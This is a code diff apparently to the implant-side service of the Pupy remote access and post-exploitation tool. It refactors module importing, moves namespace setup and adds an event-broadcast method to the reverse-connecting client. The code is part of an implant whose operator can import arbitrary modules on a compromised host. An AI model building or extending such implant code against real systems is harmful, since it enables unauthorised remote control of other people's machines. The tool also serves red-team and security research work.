@@ -70,6 +70,10 @@ REVERSE_SLAVE_CONF = dict(
 logger = pupy.get_logger('service')
 
 
+def _import(name):
+    return __import__(name, None, None, '*')
+
+
 class UpdatableModuleNamespace(ModuleNamespace):
     __slots__ = (
         '__invalidate__',
@@ -106,7 +110,6 @@ class ReverseSlaveService(Service):
         except Exception as e:
             pupy.remote_error('on_connect failed: {}; infos={}', e, infos)
 
-        pupy.namespace = UpdatableModuleNamespace(self.exposed_getmodule)
         self._conn.root.initialize_v1(
             self.exposed_namespace,
             pupy.namespace,
@@ -203,7 +206,7 @@ class ReverseSlaveService(Service):
 
     def exposed_getmodule(self, name):
         """imports an arbitrary module"""
-        return __import__(name, None, None, "*")
+        return _import(name)
 
     def exposed_obtain_call(self, function, packed_args):
         if packed_args is not None:
@@ -291,6 +294,7 @@ class PupyClient(object):
         '_launcher', 'launcher_args', 'terminated',
         'connection_info', '_connection', '_attempt',
         '_bind_service', '_connect_service', '_custom_info',
+        '_broadcast_event'
     )
 
     def __init__(self, cid, launcher, launcher_args, delays):
@@ -301,6 +305,7 @@ class PupyClient(object):
         self.terminated = False
         self._attempt = 0
         self._custom_info = {}
+        self._broadcast_event = None
 
         class client_initializer(type):
             __slots__ = ()
@@ -319,6 +324,36 @@ class PupyClient(object):
         self._connect_service = WrappedReverseSlaveService
 
         self.reset_connection_info()
+
+    def set_broadcast_event(self, callback):
+        self._broadcast_event = callback
+
+    def broadcast_event(self, eventid, *args, **kwargs):
+        if self._connection:
+            logger.debug(
+                'Pupy connected: broadcast event via connection. EventId = %08x',
+                eventid)
+
+            try:
+                self._connection.root.broadcast_event(eventid, *args, **kwargs)
+                return
+            except Exception as e:
+                logger.exception(e)
+
+        if self._broadcast_event:
+            logger.debug(
+                'Pupy is not connected, but broadcast_event defined (%s). EventId = %08x',
+                pupy.broadcast_event, eventid)
+
+            try:
+                self._broadcast_event(eventid, *args, **kwargs)
+                logger.debug('Pupy connected: broadcast completed')
+                return
+            except Exception as e:
+                logger.exception(e)
+
+        logger.debug(
+            'No way to report event. EventId = %08x', eventid)
 
     def set_connection_info(self, connection):
         self.connection_info = {
@@ -491,7 +526,6 @@ class PupyClient(object):
 
                     self._attempt += 1
 
-
 def run(config):
     launcher = config.get('launcher')
     launcher_args = config.get('launcher_args')
@@ -523,6 +557,8 @@ def run(config):
         logger.debug('Scriptlets completed')
 
     logger.debug('CID: %08x', config.get('cid'))
+
+    pupy.namespace = UpdatableModuleNamespace(_import)
 
     pupy.client = PupyClient(
         config.get('cid', 1337),
